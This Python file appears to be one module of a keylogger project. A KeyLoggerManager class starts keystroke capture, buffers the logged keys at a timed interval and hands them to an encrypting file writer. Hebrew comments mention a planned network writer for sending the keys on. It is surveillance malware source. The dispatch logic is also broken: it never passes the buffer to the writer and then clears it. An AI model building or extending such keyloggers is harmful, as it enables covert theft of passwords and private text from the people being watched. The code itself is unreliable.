from KeyLoggerService import KeyLoggerService
from FileWriter import EncrypterFileWriter
import time





class KeyLoggerManager:
    def __init__(self,timer = 60):
        self.key_logger_service = KeyLoggerService()
        self.FileWriter = EncrypterFileWriter()
        self.timer = timer
        self.buffer = []
        self.collect = True

    def collect_keystrokes_interval(self):
        self.key_logger_service.start_logging()
        while self.collect:
            keystrokes = self.key_logger_service.get_logged_keys() #זה שומר את ההקשות ושילח את זה לבופר
            self.buffer_collector(keystrokes)
            self.data_dispatcher()
            time.sleep(self.timer)
        self.key_logger_service.stop_logging()

    def buffer_collector(self,keystrokes):
        if keystrokes:
            self.buffer.extend(keystrokes)

    def data_dispatcher(self):
        if self.buffer:
            self.FileWriter.data_receiver()
            self.buffer.clear()


# אוסף הקשות כל X שניות
# מאגד ל-Buffer
# מעביר ל-
# FileWriter/NetworkWriter
